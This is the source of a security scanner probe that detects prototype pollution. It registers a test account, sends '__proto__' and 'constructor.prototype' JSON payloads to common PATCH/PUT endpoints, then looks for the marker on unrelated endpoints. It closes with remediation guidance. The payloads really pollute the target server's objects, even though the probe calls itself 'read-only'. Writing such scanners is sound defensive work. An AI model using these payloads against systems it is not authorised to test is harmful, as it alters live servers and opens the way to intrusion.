#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Prototype pollution: any PATCH/PUT endpoint that merges
user-supplied JSON into a server-side object, polluting
Object.prototype globally.

Generalises `prototype_pollution_user_patch` (Juice Shop's
`/api/Users/<id>` PATCH). The bug is in the merge implementation
(lodash.merge < 4.17.20, jquery.extend, deep-merge, mongoose
findOneAndUpdate without `safe`); the literal endpoint is
irrelevant. Any merge of `{__proto__: {x: 1}}` into a fresh object
contaminates Object.prototype, after which every other code path
sees `{}.x === 1`.

High-fidelity signal:
  Send `{"__proto__": {"dast_pp_marker_XXXX": "1"}}` (and a
  constructor.prototype variant) to candidate PATCH/PUT endpoints,
  then GET an UNRELATED endpoint and look for the marker key
  appearing in the response. The unrelated-endpoint check rules
  out simple echo-back -- the marker has to have polluted
  Object.prototype to leak there.
"""
from __future__ import annotations

import json
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

PATCH_ENDPOINTS = (
    ("/api/users/me",      "PATCH"),
    ("/api/users/me",      "PUT"),
    ("/api/profile",       "PATCH"),
    ("/api/me",            "PATCH"),
    ("/api/settings",      "PATCH"),
    ("/api/preferences",   "PATCH"),
    ("/api/account",       "PATCH"),
    ("/api/v1/me",         "PATCH"),
)

# UNRELATED endpoints to verify on. The marker leaking into any of
# these proves prototype pollution crossed object boundaries.
VERIFY_PATHS = (
    "/api/products",
    "/api/categories",
    "/api/about",
    "/api/health",
    "/api/v1/products",
    "/rest/products",
    "/products",
)


def _register_login(client: SafeClient, origin: str) -> tuple[str | None, dict]:
    email = f"pp-probe-{secrets.token_hex(6)}@dast.test"
    pw    = "Pr0be-" + secrets.token_hex(4)
    diag = {"email": email}
    body = json.dumps({
        "email": email, "password": pw, "passwordRepeat": pw,
        "securityQuestion": {"id": 1}, "securityAnswer": "probe",
    }).encode()
    r = client.request(
        "POST", urljoin(origin, "/api/Users"),
        headers={"Content-Type": "application/json"}, body=body)
    diag["register_status"] = r.status
    body = json.dumps({"email": email, "password": pw}).encode()
    r = client.request(
        "POST", urljoin(origin, "/rest/user/login"),
        headers={"Content-Type": "application/json"}, body=body)
    diag["login_status"] = r.status
    if r.status == 200 and r.body:
        try:
            doc = json.loads(r.text) or {}
            tok = ((doc.get("authentication") or {}).get("token")
                   if isinstance(doc, dict) else None) or doc.get("token")
            if tok:
                return tok, diag
        except json.JSONDecodeError:
            pass
    return None, diag


class PrototypePollutionAnyPatchProbe(Probe):
    name = "prototype_pollution_any_patch"
    summary = ("Detects prototype pollution via PATCH/PUT endpoints "
               "by injecting a marker into Object.prototype and "
               "looking for it on an unrelated endpoint.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--endpoint", action="append", default=[],
            help="Additional PATCH/PUT endpoint (e.g. '/api/foo|PATCH').")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        endpoints = list(PATCH_ENDPOINTS)
        for e in args.endpoint or []:
            if "|" in e:
                p, m = e.split("|", 1)
                endpoints.append((p.strip(), m.strip().upper()))

        token, diag = _register_login(client, origin)
        if not token:
            return Verdict(
                validated=None, confidence=0.5, ok=True,
                summary=(f"Inconclusive: could not establish a probe "
                         f"session on {origin}."),
                evidence={"origin": origin, "session": diag},
            )

        marker_key = f"dast_pp_marker_{secrets.token_hex(6)}"
        # Two payload variants: __proto__ direct, and
        # constructor.prototype indirect.
        payloads = (
            {"__proto__": {marker_key: "1"}},
            {"constructor": {"prototype": {marker_key: "1"}}},
        )

        attempts: list[dict] = []
        for path, method in endpoints:
            for payload in payloads:
                body = json.dumps(payload).encode()
                r = client.request(method,
                                    urljoin(origin, path), headers={
                                        "Authorization":
                                            f"Bearer {token}",
                                        "Content-Type":
                                            "application/json"},
                                    body=body)
                attempts.append({"path": path, "method": method,
                                  "payload":
                                      list(payload.keys())[0],
                                  "status": r.status, "size": r.size})

        # Verify pass: GET each unrelated endpoint and search for
        # marker_key in the response body.
        verify: list[dict] = []
        confirmed: dict | None = None
        for vp in VERIFY_PATHS:
            r = client.request("GET", urljoin(origin, vp), headers={
                "Authorization": f"Bearer {token}"})
            row = {"verify_path": vp, "status": r.status,
                   "size": r.size}
            if r.status == 200 and r.body and marker_key in r.text:
                row["polluted"] = True
                row["snippet"] = (r.text or "")[:200]
                confirmed = row
                verify.append(row)
                break
            verify.append(row)

        evidence = {"origin": origin, "session": diag,
                    "marker_key": marker_key, "attempts": attempts,
                    "verify": verify}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.97,
                summary=(
                    f"Confirmed: prototype pollution on {origin}. "
                    f"After PATCH/PUT with `__proto__` payload, the "
                    f"marker key `{marker_key}` appeared on the "
                    f"unrelated endpoint {confirmed['verify_path']} -- "
                    "Object.prototype was contaminated globally."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "Stop using a deep-merge function vulnerable to "
                    "`__proto__` / `constructor.prototype` keys.\n"
                    "  - lodash.merge: upgrade to >= 4.17.20 (the "
                    "  fix landed in CVE-2020-8203).\n"
                    "  - jquery.extend: pre-1.12.3 / pre-2.2.3 are "
                    "  vulnerable; upgrade or replace.\n"
                    "  - mongoose.findOneAndUpdate / set: enable "
                    "  `strictQuery` and the `Schema` filter so "
                    "  prototype keys are dropped.\n"
                    "  - Or filter inbound JSON: refuse `__proto__`, "
                    "  `constructor`, `prototype` keys at the "
                    "  request-validation layer (zod / Joi / "
                    "  ajv strict).\n"
                    "Audit any application objects created since the "
                    "exposure window for unexpected fields."),
            )
        return Verdict(
            validated=False, confidence=0.80,
            summary=(f"Refuted: tried {len(attempts)} PATCH/PUT "
                     f"combinations on {origin}; no marker leaked "
                     "into an unrelated endpoint."),
            evidence=evidence,
        )


if __name__ == "__main__":
    PrototypePollutionAnyPatchProbe().main()
